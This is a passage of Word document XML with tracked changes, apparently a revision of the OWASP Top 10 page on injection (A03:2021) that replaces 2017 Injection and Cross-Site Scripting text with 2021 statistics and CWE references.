          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>id:      "A03:2021"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="558EE5B9"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660FDDBF"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09BAC5AD" w14:textId="194D4EEE" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">#A03:2021 – Injection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[icon](assets/TOP_10_Icons_Final_Injection.png){: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id=id, name="Injection", lang=lang, source=source, parent=parent, </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>merged_from</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>=[</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>extra.osib.document</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> ~ ".2017.1", </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>extra.osib.document</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> ~ ".2017.7"] ) }}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D3E36CB" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="36C8E562" w14:textId="45D9D042" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="003A6212" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="1067" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="1068" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText xml:space="preserve"># A1:2017 </w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="5414C00F" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="1069" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1070" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>## Factors</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="3B18E906" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="1071" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="45B06265" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="1072" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1073"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1ABBA704" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="1074" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1075" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>|:-------------:|:--------------------:|:--------------------:|:--------------:|:--------------:|:----------------------:|:---------------------:|:-------------------:|:------------:|</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="2C0314A1" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="1076" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1077" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>| 33          | 19.09%             | 3.37%              | 7.25                 | 7.15                | 94.04%       | 47.90%       | 274,228           | 32,078     |</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="0D3B259B" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="1078" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="311E58DE" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="1079" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1080" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>## Overview</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="744400E8" w14:textId="77777777" w:rsidR="003A277D" w:rsidRPr="00841D1E" w:rsidRDefault="003A277D" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="1081" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="50175EF9" w14:textId="77777777" w:rsidR="003A6212" w:rsidRPr="003A6212" w:rsidRDefault="00841D1E" w:rsidP="0024421C">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:del w:id="1082" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Injection</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2BA35EFC" w14:textId="77777777" w:rsidR="003A6212" w:rsidRPr="003A6212" w:rsidRDefault="003A6212" w:rsidP="0024421C">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:del w:id="1083" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="357FABEF" w14:textId="77777777" w:rsidR="003A6212" w:rsidRPr="003A6212" w:rsidRDefault="003A6212" w:rsidP="0024421C">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:del w:id="1084" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="1085" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>| Threat agents/Attack vectors | Security Weakness           | Impacts               |</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="7DF3C71D" w14:textId="77777777" w:rsidR="003A6212" w:rsidRPr="003A6212" w:rsidRDefault="003A6212" w:rsidP="0024421C">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:del w:id="1086" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="1087" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>| -- | -- | -- |</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="0C2A94D5" w14:textId="77777777" w:rsidR="003A6212" w:rsidRPr="003A6212" w:rsidRDefault="003A6212" w:rsidP="0024421C">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:del w:id="1088" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="1089" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>| Access Lvl : Exploitability 3 | Prevalence 2 : Detectability 3 | Technical 3 : Business |</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="1E1D9C92" w14:textId="77777777" w:rsidR="003A6212" w:rsidRPr="003A6212" w:rsidRDefault="003A6212" w:rsidP="0024421C">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:del w:id="1090" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="1091" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>| Almost any source of data can be an injection vector, environment variables, parameters, external and internal web services, and all types of users. [Injection flaws](https://www.owasp.org/index.php/Injection_Flaws) occur when an attacker can send hostile data</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="1092" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve"> slides down</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> to </w:t>
      </w:r>
      <w:del w:id="1093" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText xml:space="preserve">an interpreter. | Injection flaws are very prevalent, particularly in legacy code. Injection vulnerabilities are often found in SQL, LDAP, XPath, or NoSQL queries, OS commands, XML parsers, SMTP headers, expression languages, and ORM queries. Injection flaws are easy to discover when examining code. Scanners and fuzzers can help attackers find injection flaws. |Injection can result in data loss, corruption, or disclosure to unauthorized parties, loss of accountability, or denial of access. Injection can sometimes lead to complete host takeover. The business impact depends on </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">the </w:t>
      </w:r>
      <w:del w:id="1094" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>needs</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="1095" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>third position. 94%</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> of the </w:t>
      </w:r>
      <w:del w:id="1096" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>application and data.|</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="710C6018" w14:textId="77777777" w:rsidR="003A6212" w:rsidRPr="003A6212" w:rsidRDefault="003A6212" w:rsidP="0024421C">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:del w:id="1097" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="02CF731E" w14:textId="77777777" w:rsidR="003A6212" w:rsidRPr="003A6212" w:rsidRDefault="003A6212" w:rsidP="0024421C">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:del w:id="1098" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="1099" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText># A7:2017 Cross-Site Scripting (XSS)</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="6B800177" w14:textId="77777777" w:rsidR="003A6212" w:rsidRPr="003A6212" w:rsidRDefault="003A6212" w:rsidP="0024421C">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:del w:id="1100" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="1101" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>| Threat agents/Attack vectors | Security Weakness           | Impacts               |</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="28C51B95" w14:textId="77777777" w:rsidR="003A6212" w:rsidRPr="003A6212" w:rsidRDefault="003A6212" w:rsidP="0024421C">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:del w:id="1102" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="1103" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>| -- | -- | -- |</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="2CBFFC85" w14:textId="77777777" w:rsidR="003A6212" w:rsidRPr="003A6212" w:rsidRDefault="003A6212" w:rsidP="0024421C">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:del w:id="1104" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="1105" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>| Access Lvl : Exploitability 3 | Prevalence 3 : Detectability 3 | Technical 2 : Business |</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="6FE3B053" w14:textId="35B6C840" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="003A6212" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="1106" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText xml:space="preserve">| Automated tools can detect and exploit all three forms of XSS, and there are freely available exploitation frameworks. | XSS is the second most prevalent issue in the OWASP Top 10, and is found in around two thirds of all </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>applications</w:t>
      </w:r>
      <w:del w:id="1107" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>. Automated tools can find some XSS problems automatically, particularly in mature technologies such as PHP, J2EE / JSP, and ASP.NET. | The impact of XSS is moderate for reflected and DOM XSS, and severe for stored XSS, with remote code execution on the victim's browser, such as stealing credentials, sessions, or delivering malware to the victim. |</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="402D0B3A" w14:textId="77777777" w:rsidR="003A6212" w:rsidRPr="003A6212" w:rsidRDefault="003A6212" w:rsidP="0024421C">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:del w:id="1108" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1B1490F5" w14:textId="77777777" w:rsidR="003A6212" w:rsidRPr="003A6212" w:rsidRDefault="003A6212" w:rsidP="0024421C">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:del w:id="1109" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="1110" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>## Is the Application Vulnerable?</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="0CF05DA9" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="1111" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1112" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>were tested for some form of injection with a max incidence rate of 19%, an average incidence rate of 3%, and 274k occurrences. Notable Common Weakness Enumerations (CWEs) included are</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="7C45D975" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="1113" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1114" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:lastRenderedPageBreak/>
          <w:t>*CWE-79: Cross-site Scripting*, *CWE-89: SQL Injection*, and *CWE-73:</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="1EB45F22" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="1115" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1116" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>External Control of File Name or Path*.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="08B2581F" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="1117" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3CEB5CA7" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="1118" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1119" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>## Description</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="2C4E3FC5" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="50F13EE2" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>An application is vulnerable to attack when:</w:t>
      </w:r>
    </w:p>
